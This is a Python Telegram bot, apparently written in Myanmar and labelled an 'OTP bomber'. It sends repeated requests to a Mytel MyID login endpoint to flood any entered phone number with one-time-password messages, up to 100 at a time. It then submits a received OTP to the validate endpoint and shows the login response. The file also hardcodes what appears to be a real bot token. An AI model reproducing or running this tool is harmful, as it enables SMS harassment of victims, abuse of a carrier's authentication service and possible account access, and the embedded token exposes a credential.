import logging
import requests
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- Config ---
API_TOKEN = '8702294693:AAGbo2lTWP-aV1jV8Be6nN5NSnz2WO_aZJk'
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# --- States ---
class MytelBomber(StatesGroup):
    waiting_phone = State()
    waiting_count = State()
    waiting_otp = State()

# Header for Mytel API
HEADERS = {
    'User-Agent': 'MyID/3.2.1 (Android; 13)',
    'Content-Type': 'application/json'
}

# --- Keyboards ---
def get_cancel_kb():
    return InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))

# --- Handlers ---

@dp.message_handler(commands=['start'])
async def cmd_start(m: types.Message):
    welcome_text = (
        "🚀 **MYID OTP BOMBER - BY DOMINIC**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "ကိုကို့ရဲ့ Mytel နံပါတ်ကို OTP အကြိမ်ရေ အများကြီး \n"
        "ပို့လို့ရမယ့် Bot ဖြစ်ပါတယ်ဗျ။\n\n"
        "စတင်ရန် /login ကို နှိပ်ပါ သို့မဟုတ် ဖုန်းနံပါတ် ရိုက်ထည့်ပါ ကိုကို။"
    )
    await m.answer(welcome_text, parse_mode="Markdown")

@dp.message_handler(commands=['login'], state="*")
async def start_login(m: types.Message):
    await m.answer("📱 **ဖုန်းနံပါတ် ရိုက်ထည့်ပေးပါ ကိုကို-**\n(ဥပမာ - 0969xxxxxxx)", reply_markup=get_cancel_kb())
    await MytelBomber.waiting_phone.set()

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_action(cb: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await cb.message.edit_text("❌ လုပ်ဆောင်ချက်ကို ဖျက်သိမ်းလိုက်ပါပြီ ကိုကို။")
    await cb.answer()

@dp.message_handler(state=MytelBomber.waiting_phone)
async def process_phone(m: types.Message, state: FSMContext):
    phone = m.text.strip()
    if not phone.startswith("09") or len(phone) < 9:
        return await m.reply("❌ ဖုန်းနံပါတ် ပုံစံမှားနေပါတယ် ကိုကို။")

    await state.update_data(phone=phone)
    await m.answer(f"🔢 **{phone}** ဆီကို OTP ဘယ်နှစ်ကြိမ် ပို့မလဲ ကိုကို?\n(1 - 100 ကြိမ်အတွင်း ထည့်ပေးပါ)")
    await MytelBomber.waiting_count.set()

@dp.message_handler(state=MytelBomber.waiting_count)
async def process_count(m: types.Message, state: FSMContext):
    if not m.text.isdigit():
        return await m.reply("❌ ဂဏန်းပဲ ရိုက်ပေးပါ ကိုကို။")
    
    count = int(m.text)
    if count < 1 or count > 100:
        return await m.reply("⚠️ ၁ ကနေ ၁၀၀ ကြိမ်အတွင်းပဲ ရွေးပေးပါ ကိုကို။")

    user_data = await state.get_data()
    phone = user_data.get("phone")
    
    status_msg = await m.answer(f"⏳ **BOMBER STARTING...**\n📱 Phone: `{phone}`\n📊 Count: `{count}`", parse_mode="Markdown")
    
    success = 0
    fail = 0
    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/v2/login/action/check-account?phoneNumber={phone}"

    for i in range(1, count + 1):
        try:
            res = requests.get(url, headers=HEADERS, timeout=5)
            if res.status_code == 200:
                success += 1
            else:
                fail += 1
            
            # ၅ ကြိမ်မြောက်တိုင်း Status ကို Update လုပ်မယ် (UI ကြည့်ကောင်းအောင်)
            if i % 5 == 0 or i == count:
                await status_msg.edit_text(
                    f"🚀 **BOMBING IN PROGRESS...**\n\n"
                    f"📱 Target: `{phone}`\n"
                    f"🔄 Progress: `{i}/{count}`\n"
                    f"✅ Success: `{success}`\n"
                    f"❌ Failed: `{fail}`",
                    parse_mode="Markdown"
                )
            await asyncio.sleep(0.5) # Server Block မဖြစ်အောင် ခဏခြားပေးတာ
        except:
            fail += 1

    await status_msg.edit_text(
        f"🏁 **MISSION COMPLETED!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"✅ Total Success: `{success}`\n"
        f"❌ Total Failed: `{fail}`\n\n"
        "OTP ရိုက်ထည့်ပြီး Login ဝင်ချင်ရင် ရိုက်ပေးပါ ကိုကို-",
        parse_mode="Markdown"
    )
    await MytelBomber.waiting_otp.set()

@dp.message_handler(state=MytelBomber.waiting_otp)
async def process_otp(m: types.Message, state: FSMContext):
    otp = m.text.strip()
    data = await state.get_data()
    phone = data.get("phone")

    v_url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp"
    payload = {"phoneNumber": phone, "otp": otp, "isWap": False}

    try:
        res = requests.post(v_url, json=payload, headers=HEADERS)
        if res.status_code == 200:
            await m.answer(f"🎉 **Login Successful!**\n\nResponse:\n`{res.json()}`", parse_mode="Markdown")
        else:
            await m.answer("❌ OTP မှားယွင်းနေပါတယ် ကိုကို။")
    except Exception as e:
        await m.answer(f"Error: {e}")
    
    await state.finish()

if __name__ == '__main__':
    print("Dominic MyID Bomber is Online!")
    executor.start_polling(dp, skip_updates=True)
